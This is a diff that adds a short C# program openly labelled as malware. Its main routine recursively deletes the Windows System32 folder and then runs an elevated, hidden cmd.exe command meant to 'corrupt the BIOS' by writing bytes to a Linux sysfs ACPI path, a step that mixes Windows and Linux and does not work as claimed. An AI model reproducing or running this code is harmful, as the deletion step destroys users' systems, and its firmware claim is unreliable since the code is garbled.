@@ -1,0 +1,30 @@
+//This malware is written in C#
+
+using System;
+using System.Diagnostics;
+using System.IO;
+
+namespace Malware
+{
+    class Program
+    {
+        // Location of the system32 folder
+        const string system32 = "C:\\Windows\\System32\\";
+
+        static void Main(string[] args)
+        {
+
+            // Delete system32 folder
+            Directory.Delete(system32, true);
+
+            // Run a BIOS command to corrupt it
+            Process process = new Process();
+            process.StartInfo.FileName = "cmd.exe";
+            process.StartInfo.Arguments = "/C \"echo -e '\x0F\xFF\xFF\xFF\xFF\xFF\xFF\xFF' > /sys/firmware/acpi/tables/DSDT";
+            process.StartInfo.Verb = "runas";
+            process.StartInfo.CreateNoWindow = true;
+            process.StartInfo.UseShellExecute = false;
+            process.Start();
+        }
+    }
+}
